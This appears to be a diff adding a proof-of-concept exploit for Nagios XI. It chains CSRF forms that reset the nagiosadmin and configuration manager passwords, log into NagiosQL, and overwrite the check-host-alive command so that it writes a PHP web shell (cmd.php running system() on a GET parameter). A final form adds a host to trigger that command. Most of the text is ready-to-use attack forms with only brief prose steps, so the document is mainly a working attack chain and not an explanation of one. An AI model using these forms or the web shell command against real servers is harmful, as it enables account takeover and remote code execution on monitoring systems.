@@ -1,0 +1,132 @@
+Reset the nagiosadmin password via CSRF
+
+This can be useful to hijack the administrators account.
+&lt;input type='button' id='adminpassword' value='Set nagiosadmin Password'/&gt;
+&lt;form name=&quot;adminpasswordform&quot;
+    action=&quot;http://www.example.com/nagiosxi/account/main.php?page=acctinfo&quot;
+    method=&quot;POST&quot; target=&quot;hidden&quot; class=&quot;invisible&quot;&gt;
+    &lt;input type=&quot;input&quot; name=&quot;defaultDateFormat&quot; value=&quot;1&quot; /&gt;
+    &lt;input type=&quot;input&quot; name=&quot;defaultLanguage&quot; value=&quot;en&quot; /&gt;
+    &lt;input type=&quot;input&quot; name=&quot;defaultNumberFormat&quot; value=&quot;1&quot; /&gt;
+    &lt;input type=&quot;input&quot; name=&quot;defaultTheme&quot; value=&quot;none&quot; /&gt;
+    &lt;input type=&quot;input&quot; name=&quot;email&quot; value=&quot;adam@ngenuity-is.com&quot; /&gt;
+    &lt;input type=&quot;input&quot; name=&quot;name&quot; value=&quot;Nagios Administrator&quot; /&gt;
+    &lt;input type=&quot;input&quot; name=&quot;password1&quot; value=&quot;letmein1&quot; /&gt;
+    &lt;input type=&quot;input&quot; name=&quot;password2&quot; value=&quot;letmein1&quot; /&gt;
+    &lt;input type=&quot;input&quot; name=&quot;update&quot; value=&quot;1&quot; /&gt;
+&lt;/form&gt;
+
+
+Reset the configuration manager password
+
+The attacker just has the victim visit the following URL. Even if the
+nagios admin is not logged into the configuration admin, the attacker can…
+
+1. Force a password reset of the configuration manager
+2. Log the nagiosadmin into the configuration manager
+3. Create a simple web shell on the nagios server.
+
+http://www.example.com/nagiosxi/admin/credentials.php?options=1
+    &update=1
+    &config_admin_password=letmein1
+    &subsystem_ticket=2objrv9t6glq
+    &config_backend_password=38ajpt
+
+Log into the configuration manager with previously set password
+
+&lt;input type='button' id='login' value='Login to Config Manager' /&gt;
+&lt;form name='loginform' action=&quot;http://www.example.com/nagiosql/index.php&quot;
+method=&quot;POST&quot; target=&quot;hidden&quot; class=&quot;invisible&quot;&gt;
+&lt;input type=&quot;input&quot; name=&quot;Submit&quot; value=&quot;Login&quot;/&gt;
+&lt;input type=&quot;input&quot; name=&quot;tfPassword&quot; value=&quot;letmein1&quot;/&gt;
+&lt;input type=&quot;input&quot; name=&quot;tfUsername&quot; value=&quot;nagiosadmin&quot;/&gt;
+&lt;/form&gt;
+
+Modify nagios command to create a webshell when run
+
+Note the \ before the ; in our php code is what makes this possible.
+Normally Nagios would not allow for a ; to be input into the command
+string unless escaped. PHP will happily still execute this code despite
+the \ being there.
+
+&lt;input type='button' id='modifycmd' value='Create Web Shell Command' /&gt;
+&lt;form name='modifycmdform'
+    action=&quot;http://www.example.com/nagiosql/admin/checkcommands.php&quot;
+    method=&quot;POST&quot; target=&quot;hidden&quot; class=&quot;invisible&quot;&gt;
+    &lt;input type=&quot;input&quot; name=&quot;chbActive&quot; value=&quot;1&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;hidActive&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;hidId&quot; value=&quot;3&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;hidLimit&quot; value=&quot;0&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;modus&quot; value=&quot;modify&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;selCommandType&quot; value=&quot;1&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfCommand&quot;
+        value='/bin/echo &quot;&lt;pre&gt;&lt;?php echo system(\$$_GET[\&quot;c\&quot;])\; ?&gt;
+        &lt;/pre&gt;&quot; &gt; /usr/local/nagiosxi/html/cmd.php' /&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfName&quot; value=&quot;check-host-alive&quot;/&gt;
+&lt;/form&gt;
+
+Add a Host to make sure our command is triggered, and the web shell created.
+
+Yes this is a long and boring form…
+
+&lt;form name='addhostform' action='http://www.example.com/nagiosql/admin/hosts.php'
+    method='POST' target='hidden' class='invisible'&gt;
+    &lt;input type=&quot;input&quot; name=&quot;chbActive&quot; value=&quot;1&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;hidActive&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;hidId&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;hidLimit&quot; value=&quot;0&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;hidName&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;modus&quot; value=&quot;insert&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radActiveChecksEnabled&quot; value=&quot;2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radContactGroups&quot; value=&quot;1&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radContacts&quot; value=&quot;1&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radEventEnable&quot; value=&quot;2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radFlapEnable&quot; value=&quot;2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radFreshness&quot; value=&quot;2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radHostGroups&quot; value=&quot;2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radNoStatusInfos&quot; value=&quot;2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radNotifEnabled&quot; value=&quot;2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radObsess&quot; value=&quot;2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radParent&quot; value=&quot;2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radPassiveChecksEnabled&quot; value=&quot;2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radPerfData&quot; value=&quot;2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;radStatusInfos&quot; value=&quot;2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;selCheckPeriod&quot; value=&quot;0&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;selEventHandler&quot; value=&quot;0&quot;/&gt;
+    &lt;!-- Command we overwrote --&gt;
+    &lt;input type=&quot;input&quot; name=&quot;selHostCommand&quot; value=&quot;3&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;selNotifPeriod&quot; value=&quot;3&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;selTemplate&quot; value=&quot;2::1&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfActionURL&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfAddress&quot; value=&quot;4.2.2.2&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfArg1&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfArg2&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfArg3&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfArg4&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfArg5&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfArg6&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfArg7&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfArg8&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfCheckInterval&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfD2Coords&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfD3Coords&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfDisplay&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfFirstNotifDelay&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfFreshTreshold&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfFriendly&quot; value=&quot;testpwn&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfGenericName&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfHighFlat&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfIconImage&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfIconImageAlt&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfLowFlat&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfMaxCheckAttempts&quot; value=&quot;5&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfName&quot; value=&quot;testpwn&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfNotes&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfNotesURL&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfNotifInterval&quot; value=&quot;0&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfRetryInterval&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfStatusImage&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;tfVmrlImage&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;txtVariablename&quot; value=&quot;&quot;/&gt;
+    &lt;input type=&quot;input&quot; name=&quot;txtVariablevalue&quot; value=&quot;&quot;/&gt;
+&lt;/form&gt;
